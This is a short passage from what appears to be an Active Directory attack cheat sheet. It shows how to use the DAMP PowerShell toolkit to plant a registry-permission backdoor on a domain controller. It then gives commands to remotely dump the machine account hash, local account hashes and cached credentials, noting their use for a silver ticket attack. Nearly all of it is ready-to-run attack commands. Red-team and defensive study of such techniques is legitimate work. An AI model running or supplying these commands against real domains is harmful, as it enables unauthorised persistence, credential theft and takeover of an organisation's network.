Using [DAMP toolkit](https://github.com/HarmJ0y/DAMP), we can backdoor the DC registry to give us access on the `SAM`, `SYSTEM`, and `SECURITY` registry hives. This allows us to remotely dump DC secrets (hashes).

We add the backdoor using the `Add-RemoteRegBackdoor.ps1` cmdlet from DAMP.

```powershell
Add-RemoteRegBackdoor -ComputerName dc.targetdomain.com -Trustee BackdoorUser
```

Dump secrets remotely using the `RemoteHashRetrieval.ps1` cmdlet from DAMP (run as ‘BackdoorUser’ user).

```powershell
# Get machine account hash for silver ticket attack
Get-RemoteMachineAccountHash -ComputerName DC01

# Get local account hashes
Get-RemoteLocalAccountHash -ComputerName DC01

# Get cached credentials (if any)
Get-RemoteCachedCredential -ComputerName DC01
```